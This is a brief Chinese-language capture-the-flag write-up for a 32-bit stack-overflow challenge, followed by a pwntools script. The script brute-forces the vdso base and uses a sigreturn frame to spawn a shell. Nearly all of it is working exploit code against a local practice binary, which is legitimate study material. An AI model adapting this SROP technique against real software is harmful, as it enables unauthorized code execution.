# 思路
32位程序，没有保护，只有一个栈溢出。开始我一直在想怎么泄露vdso基地址，打srop。之后发现32位，有got表的情况下由于不需要操作很多寄存器，ret2elf的操作空间很大。

from pwn import *
bin_sh_addr = 0x0804C020
bss_addr = 0x0804C02A
vdso_range = range(0xf7ed0000, 0xf7fd0000, 0x1000)
# vdso_range = range(0xf76d9000, 0xf77ce000, 0x1000)0xf7fc7000
def bruteforce():
    global p
    context.arch = 'i386'
    
    p = process('./ret2vdso_x32')
    global vdso_addr
    #vdso_addr = 0xf7fc7000
    vdso_addr = random.choice(vdso_range)
    print('Try vdso %s' % hex(vdso_addr))

    frame = SigreturnFrame(kernel="i386")
    frame.eax = constants.SYS_execve
    frame.ebx = bin_sh_addr
    frame.eip = vdso_addr + 0x406 # address of int 0x80
    frame.esp = bss_addr
    frame.ebp = bss_addr
    frame.gs = 99
    frame.cs = 35
    frame.es = 43
    frame.ds = 43
    frame.ss = 43

    ret_addr = vdso_addr + 0x401 # address of sigreturn

    payload = flat([cyclic(0x10c+4), ret_addr, frame])
    p.recvuntil(b'> ')
    p.send(payload)
    p.sendline(b'echo pwned')
    data = p.recvuntil(b'pwned')
    if data != b'pwned':
        info('Failed')

    return
if __name__ == '__main__':
    global p, vdso_addr
    i = 1
    while True:
        print('Try %d' % i)
        try:
            bruteforce()
        except Exception as e:
            info('Wrong VDSO')
            p.close()
            i += 1
            continue
        info('vdso_addr = ' + hex(vdso_addr))
        break
    p.interactive()
